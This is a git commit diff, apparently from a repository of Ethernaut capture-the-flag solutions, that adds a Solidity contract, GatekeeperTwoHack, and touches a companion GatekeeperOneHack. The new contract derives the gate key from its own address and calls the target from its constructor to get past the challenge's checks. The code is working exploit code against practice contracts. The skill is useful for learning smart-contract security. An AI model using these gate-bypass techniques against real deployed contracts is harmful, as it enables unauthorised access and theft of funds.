56ff64d7be61bc353cdc989b36b7c3326963c904
Matous Pistora <matous.pistora@nftscoring.com>
2022-07-25 09:07:02 +0200

    solve GatekeeperTwo

--- src/GatekeeperOne/GatekeeperOneHack.sol
+++ src/GatekeeperOne/GatekeeperOneHack.sol
@@ -8,7 +8,6 @@ interface IGatekeeperOne {
 
 contract GatekeeperOneHack {
     function attack(address _target) public returns (bool) {
-
         bytes8 key = bytes8(uint64(0x1000000000000000) + uint16(uint160(tx.origin)));
         require(gasleft() > 200000, "more gas");
         return IGatekeeperOne(_target).enter{gas: (8191 * 10) + 271}(key);
---
+++ src/GatekeeperTwo/GatekeeperTwoHack.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _key) external returns (bool);
+}
+
+contract GatekeeperTwoHack {
+    constructor(address _target) {
+        unchecked {
+            bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
+            IGatekeeperTwo(_target).enter(key);
+        }
+    }
+}
